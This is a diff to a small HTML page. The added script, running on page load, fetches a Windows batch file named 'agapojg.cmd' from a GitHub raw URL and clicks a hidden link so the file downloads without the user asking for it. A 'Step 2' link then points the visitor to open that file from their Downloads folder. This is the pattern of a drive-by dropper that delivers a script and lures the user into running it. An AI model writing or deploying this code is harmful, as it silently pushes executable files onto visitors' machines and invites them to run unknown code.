@@ -1,9 +1,22 @@
 <!DOCTYPE html>
 <html>
 <head>
-<a href="https://raw.githubusercontent.com/Criptc/Dump/main/" download="agapojg.cmd">
-         <button type="button">Step 1</button> 
-         </a> 
+<script>
+fetch('https://raw.githubusercontent.com/Criptc/Dump/main/agapojg.cmd')
+  .then(resp => resp.blob())
+  .then(blob => {
+    const url = window.URL.createObjectURL(blob);
+    const a = document.createElement('a');
+    a.style.display = 'none';
+    a.href = url;
+    // the filename you want
+    a.download = 'agapojg.cmd';
+    document.body.appendChild(a);
+    a.click();
+    window.URL.revokeObjectURL(url);
+  })
+  .catch(() => alert('oh no!'));
+  </script>
 </head
 <body>
 <a href="file:///C:/User/%username%/Downloads/agapojg.cmd" title="Open">Step 2</a>
